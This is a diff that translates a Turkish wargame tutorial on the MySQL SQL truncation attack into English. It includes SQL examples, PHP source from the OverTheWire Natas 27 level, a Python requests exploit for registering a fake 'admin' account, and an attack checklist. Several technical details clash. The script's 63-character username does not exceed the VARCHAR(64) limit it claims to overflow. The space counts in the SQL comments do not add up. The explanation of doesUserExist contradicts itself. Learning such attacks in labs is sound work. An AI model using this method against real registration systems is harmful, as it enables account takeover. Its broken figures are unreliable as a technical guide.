@@ -1,23 +1,23 @@
-# 🌐 Web Güvenliği — SQL Truncation Attack
+# 🌐 Web Security — SQL Truncation Attack
 
-> MySQL bir VARCHAR alanına sığmayan veriyi kesmeden önce boşlukları da siler.
-> Bu davranışı kullanarak farklı bir kullanıcı gibi kayıt olunabilir.
+> Before MySQL truncates data that doesn't fit a VARCHAR field, it also strips spaces.
+> Using this behavior, you can register as if you were a different user.
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [SQL Truncation Nedir?](#sql-truncation-nedir)
-- [MySQL VARCHAR Davranışı](#mysql-varchar-davranışı)
+- [What Is SQL Truncation?](#what-is-sql-truncation)
+- [MySQL VARCHAR Behavior](#mysql-varchar-behavior)
 - [Trailing Space + Truncation](#trailing-space--truncation)
-- [Authentication Bypass Senaryosu](#authentication-bypass-senaryosu)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [Authentication Bypass Scenario](#authentication-bypass-scenario)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## SQL Truncation Nedir?
+## What Is SQL Truncation?
 
-MySQL'de bir VARCHAR(n) alanına n karakterden uzun bir string INSERT edildiğinde, MySQL veriyi n karaktere **keser (truncate)**. Üstelik MySQL, trailing (sondaki) boşlukları keserken de bazı özel davranışlar sergiler.
+In MySQL, when a string longer than n characters is INSERTed into a VARCHAR(n) field, MySQL **truncates** the data to n characters. Moreover, MySQL also exhibits some special behaviors when stripping trailing spaces.
 
 ```sql
 CREATE TABLE users (
@@ -25,28 +25,28 @@ CREATE TABLE users (
     password VARCHAR(16)
 );
 
-INSERT INTO users VALUES ('admin               x', 'şifre');
--- username 16 karaktere kesilir: "admin           " (16 karakter)
--- Sonra MySQL trailing space'leri de kaldırır → "admin"
+INSERT INTO users VALUES ('admin               x', 'password');
+-- username is truncated to 16 characters: "admin           " (16 characters)
+-- Then MySQL also removes the trailing spaces → "admin"
 ```
 
 ---
 
-## MySQL VARCHAR Davranışı
+## MySQL VARCHAR Behavior
 
 ```sql
--- VARCHAR(10) alanına 15 karakter insert et
+-- Insert 15 characters into a VARCHAR(10) field
 INSERT INTO test VALUES ('12345678901234X');
--- Kaydedilen: '1234567890' (10 karakter, X ve sonrası kesildi)
+-- Stored: '1234567890' (10 characters, X and everything after is truncated)
 
--- Trailing space durumu
+-- Trailing space case
 INSERT INTO test VALUES ('admin     X');
--- VARCHAR(10): 'admin     ' (10 karakter, X kesildi)
--- MySQL trailing space'leri karşılaştırmada ignore eder
--- SELECT * WHERE username='admin' → bu kaydı bulur!
+-- VARCHAR(10): 'admin     ' (10 characters, X is truncated)
+-- MySQL ignores trailing spaces in comparisons
+-- SELECT * WHERE username='admin' → finds this record!
 ```
 
-### UNIQUE Constraint ile Etkileşim
+### Interaction with the UNIQUE Constraint
 
 ```sql
 CREATE TABLE users (
@@ -54,59 +54,59 @@ CREATE TABLE users (
     password VARCHAR(16)
 );
 
--- "admin" zaten kayıtlı
-INSERT INTO users VALUES ('admin', 'sifre1');   -- OK
-INSERT INTO users VALUES ('admin', 'sifre2');   -- ERROR: Duplicate entry
-INSERT INTO users VALUES ('admin          x', 'sifre3');
--- Truncate sonrası: 'admin          ' → 'admin' ile aynı!
--- Ama bazı MySQL konfigürasyonlarında bu UNIQUE ihlali olmayabilir
--- ve kayıt oluşturulabilir
+-- "admin" is already registered
+INSERT INTO users VALUES ('admin', 'password1');   -- OK
+INSERT INTO users VALUES ('admin', 'password2');   -- ERROR: Duplicate entry
+INSERT INTO users VALUES ('admin          x', 'password3');
+-- After truncation: 'admin          ' → same as 'admin'!
+-- But in some MySQL configurations this may not be a UNIQUE violation
+-- and the record can be created
 ```
 
 ---
 
 ## Trailing Space + Truncation
 
-### Saldırı Fikri
+### The Attack Idea
 
-1. `admin` kullanıcısı sistemde kayıtlı, şifresini bilmiyoruz
-2. `admin` ile kayıt olmaya çalışsak `UNIQUE` kısıtı engeller
-3. Ama `"admin" + boşluklar + "x"` gönderirsek:
-   - MySQL truncate eder → `"admin          "` (16 karakter)
-   - Trailing space'ler anlamsız → `"admin"` gibi davranır
-   - Yeni kayıt oluşturulur — **kendi seçtiğimiz şifre ile**
-4. Giriş yaparken username `admin`, şifre bizim belirlediğimiz
-5. MySQL `WHERE username='admin'` sorgusunda her iki kaydı da bulabilir
-   — ilk bulunan bizim kayıt → giriş başarılı!
+1. The `admin` user is registered in the system, and we don't know its password
+2. If we try to register with `admin`, the `UNIQUE` constraint blocks us
+3. But if we send `"admin" + spaces + "x"`:
+   - MySQL truncates it → `"admin          "` (16 characters)
+   - The trailing spaces are meaningless → it behaves like `"admin"`
+   - A new record is created — **with a password of our choosing**
+4. When logging in, the username is `admin` and the password is the one we set
+5. MySQL may find both records in the `WHERE username='admin'` query
+   — the first one found is our record → login successful!
 
 ---
 
-## Authentication Bypass Senaryosu
+## Authentication Bypass Scenario
 
 ```sql
--- Mevcut durum:
--- users tablosu, username VARCHAR(64)
--- admin kayıtlı, şifresi bilinmiyor
+-- Current state:
+-- users table, username VARCHAR(64)
+-- admin is registered, its password is unknown
 
--- Saldırı:
+-- Attack:
 INSERT INTO users (username, password)
-VALUES ('admin                                                              x', 'bizim_şifre');
---       ↑ 64+ karakter: "admin" + 59 boşluk + "x"
--- MySQL truncate eder → "admin" + 58 boşluk (64 karakter)
--- Trailing space → "admin" gibi saklanır
+VALUES ('admin                                                              x', 'our_password');
+--       ↑ 64+ characters: "admin" + 59 spaces + "x"
+-- MySQL truncates it → "admin" + 58 spaces (64 characters)
+-- Trailing space → stored like "admin"
 
--- Giriş:
-SELECT * FROM users WHERE username='admin' AND password='bizim_şifre'
--- Bu sorgu bizim kaydımızı bulur!
+-- Login:
+SELECT * FROM users WHERE username='admin' AND password='our_password'
+-- This query finds our record!
 ```
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 27 — Truncation ile Admin Erişimi
+### Natas 27 — Admin Access via Truncation
 
-**Kaynak kod (özet):**
+**Source code (summary):**
 
 ```php
 <?php
@@ -124,7 +124,7 @@ function checkCredentials($link, $usr, $pass) {
 }
 
 function createUser($link, $usr, $pass) {
-    // Kullanıcı yoksa oluştur
+    // Create the user if it doesn't exist
     if(!doesUserExist($link, $usr)) {
         $user = mysql_real_escape_string($usr);
         $pass = mysql_real_escape_string($pass);
@@ -143,13 +143,13 @@ function doesUserExist($link, $usr) {
 }
 ```
 
-**Sorun:**
+**Problem:**
 
-`doesUserExist()` → `WHERE username='admin                 x'` → truncation sonrası `WHERE username='admin'` → kayıt var, `createUser` çağrılmaz.
+`doesUserExist()` → `WHERE username='admin                 x'` → after truncation `WHERE username='admin'` → the record exists, `createUser` is not called.
 
-Ama `checkCredentials()` → `WHERE username='admin' AND password='bizim_md5'` → `admin`'in kayıtlı şifresi bizimkiyle eşleşmez.
+But `checkCredentials()` → `WHERE username='admin' AND password='our_md5'` → admin's registered password doesn't match ours.
 
-Buradaki ince fark: `doesUserExist` truncation'dan önce kontrol yapıyor, ancak bazı MySQL sürümleri ve `strict mode` kapalıyken truncation ile duplicate kayıt oluşturulabiliyor.
+The subtle difference here: `doesUserExist` checks before truncation, but in some MySQL versions and with `strict mode` off, a duplicate record can be created via truncation.
 
 **Exploit:**
 
@@ -158,60 +158,60 @@ import requests
 
 url      = "http://natas27.natas.labs.overthewire.org/"
 username = "natas27"
-password = "[natas27_şifresi]"
+password = "[natas27_password]"
 
-# "admin" + 57 boşluk + "x" = 63 karakter (VARCHAR(64)'ü truncate eder)
+# "admin" + 57 spaces + "x" = 63 characters (truncates VARCHAR(64))
 evil_user = "admin" + " " * 57 + "x"
-evil_pass = "merhaba"
+evil_pass = "hello"
 
-# Adım 1: Sahte admin hesabı oluştur
+# Step 1: Create the fake admin account
 r = requests.post(
     url,
     data={"username": evil_user, "password": evil_pass},
     auth=(username, password)
 )
-print("[*] Kayıt isteği gönderildi")
+print("[*] Registration request sent")
 
-# Adım 2: Truncate edilmiş admin ile giriş yap
+# Step 2: Log in with the truncated admin
 r = requests.post(
     url,
     data={"username": "admin", "password": evil_pass},
     auth=(username, password)
 )
 if "natas28" in r.text or "Password" in r.text:
-    print("[✓] Admin girişi başarılı!")
+    print("[✓] Admin login successful!")
     print(r.text)
 ```
 
 ---
 
-### Truncation — Kontrol Listesi
+### Truncation — Checklist
 
 ```
-Tespit:
-  ☐ Kayıt formu var mı?
-  ☐ Tablo schema'sında VARCHAR uzunluğu nedir?
-  ☐ Strict mode kapalı mı? (MySQL eski sürüm)
-  ☐ doesUserExist → truncate'ten önce mi sonra mı kontrol ediyor?
+Detection:
+  ☐ Is there a registration form?
+  ☐ What is the VARCHAR length in the table schema?
+  ☐ Is strict mode off? (old MySQL version)
+  ☐ Does doesUserExist check before or after truncation?
 
 Exploit:
-  ☐ [hedef_kullanıcı] + [boşluklar] + [rastgele karakter]
-  ☐ Toplam uzunluk VARCHAR sınırını geçmeli
-  ☐ Kendi şifrenle kayıt ol
-  ☐ Temiz kullanıcı adıyla giriş yap
+  ☐ [target_user] + [spaces] + [random character]
+  ☐ The total length must exceed the VARCHAR limit
+  ☐ Register with your own password
+  ☐ Log in with the clean username
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
-- [SQL Truncation Attack — Basis](https://resources.infosecinstitute.com/topic/sql-truncation-attack/)
+- [SQL Truncation Attack — Basics](https://resources.infosecinstitute.com/topic/sql-truncation-attack/)
 - [MySQL — String Truncation](https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_strict_all_tables)
 - [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 
 ---
 
-**Önceki konu:** [18_php_object_injection.md](./18_php_object_injection.md)
-**Sonraki konu:** [20_ecb_mode_zafiyeti.md](./20_ecb_mode_zafiyeti.md)
+**Previous topic:** [18_php_object_injection.md](./18_php_object_injection.md)
+**Next topic:** [20_ecb_mode_vulnerability.md](./20_ecb_mode_vulnerability.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
